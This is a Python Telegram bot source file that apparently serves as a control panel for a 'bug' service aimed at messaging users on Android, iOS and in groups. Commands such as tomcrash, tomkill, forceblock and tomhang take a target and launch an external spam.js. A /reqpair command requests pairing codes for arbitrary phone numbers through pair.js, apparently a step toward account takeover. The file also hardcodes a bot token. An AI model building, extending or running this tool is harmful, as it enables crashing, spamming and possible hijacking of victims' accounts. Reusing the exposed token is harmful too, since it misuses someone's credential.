import os
import logging
import subprocess
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, MessageHandler, filters, ContextTypes

# --- সেটিংস ---
TOKEN = "8759130990:AAEZ1C94vKCHsUqMiDy42hO4Y38V1iZZoyI" # তোর নতুন টোকেন
VIP_USERS = [7899672241]
IMAGE_URL = "https://i.postimg.cc/k4r8sG52/1775260136317.png" 
GROUP_LINK = "https://t.me/tomxbugvip"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def get_main_menu(user_id):
    status = "VIP Member ✅" if user_id in VIP_USERS else "Free User ❌"
    text = (
        "┌────┤ **𝐓𝐎𝐌-𝐗 𝐁𝐔𝐆 𝐕𝐈𝐏** ├────┐\n"
        f"│➤ Name : `TOM PRIME X`\n"
        f"│➤ Developer : @TomPrimeX\n"
        f"│➤ Status : {status}\n"
        f"│➤ Online : Active ✅\n"
        "└───────────────────────┘\n\n"
        "**Press the buttons below to navigate**"
    )
    keyboard = [
        [InlineKeyboardButton("║ Bug Menu ║", callback_data="btn_bug"), 
         InlineKeyboardButton("║ Misc Menu ║", callback_data="btn_misc")],
        [InlineKeyboardButton("║ SMM MENU ║", callback_data="btn_smm")],
        [InlineKeyboardButton("║ Support Group ║", url=GROUP_LINK)]
    ]
    return text, InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text, reply_markup = get_main_menu(update.effective_user.id)
    await update.message.reply_photo(photo=IMAGE_URL, caption=text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in VIP_USERS: return
    
    text = update.message.text.lower()
    args = text.split()
    cmd = args[0]

    if cmd == "/reqpair":
        if len(args) < 2: return await update.message.reply_text("❌ Usage: `/reqpair +880...`")
        num = args[1].replace("+", "")
        await update.message.reply_text(f"⏳ **Requesting Pairing Code for {num}...**\nWait 10-15 seconds for the message!")
        # নোড ফাইল রান করা
        subprocess.Popen(["node", "pair.js", num])

    # তোর বাকি সব কমান্ডের অ্যাটাক লজিক
    attack_cmds = ['tomcsdroid', 'tomjam', 'tomcut', 'tomsys', 'tomcrash', 'tomkill', 'forceblock', 'tomcs', 'tomhiden', 'tomoff', 'tomhang', 'tomsysgp', 'hangui', 'pokmix']
    if any(cmd.startswith(c) for c in attack_cmds):
        if len(args) < 2: return await update.message.reply_text(f"❌ Usage: `{cmd} target time`")
        target = args[1]
        subprocess.Popen(["node", "spam.js", target]) 
        await update.message.reply_photo(photo=IMAGE_URL, caption=f"┌───┤ **𝐓𝐎𝐌-𝐗 𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌** ├───┐\n🦠 **Status:** `Success Executions`\n👤 **Target:** `{target}`\n🎭 **Type Bug:** `{cmd.upper()}`\n└───────────────────────┘", parse_mode='Markdown')

async def handle_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "btn_bug":
        bug_text = "┏━━━━━━ **𝐓𝐎𝐌-𝐗 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔** ━━━━━━\n┣━━━━ **𝐏𝐎𝐊 𝐏𝐎𝐊 𝐀𝐍𝐃𝐑𝐎𝐈𝐃** ━━━━\n┃ ➤ tomcsdroid\n┃ ➤ tomjam\n┃ ➤ tomcut\n┃ ➤ tomsys\n┃ ➤ tomcrash\n┃ ➤ tomkill\n┃ ➤ forceblock\n┃\n┣━━━━━━ **𝐏𝐎𝐊 𝐏𝐎𝐊 𝐈𝐎𝐒** ━━━━━━\n┃ ➤ tomcs\n┃ ➤ tomhiden\n┃ ➤ tomoff\n┃ ➤ tomhang\n┃\n┣━━━━━━ **𝐏𝐎𝐊 𝐏𝐎𝐊 𝐆𝐑𝐎𝐔𝐏** ━━━━━━\n┃ ➤ tomsysgp\n┃ ➤ hangui\n┃ ➤ pokmix\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        await query.edit_message_caption(caption=bug_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="home")]]), parse_mode='Markdown')
    elif query.data == "home":
        t, r = get_main_menu(query.from_user.id)
        await query.edit_message_caption(caption=t, reply_markup=r, parse_mode='Markdown')

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_click))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_commands))
    app.run_polling()

if __name__ == "__main__":
    main()
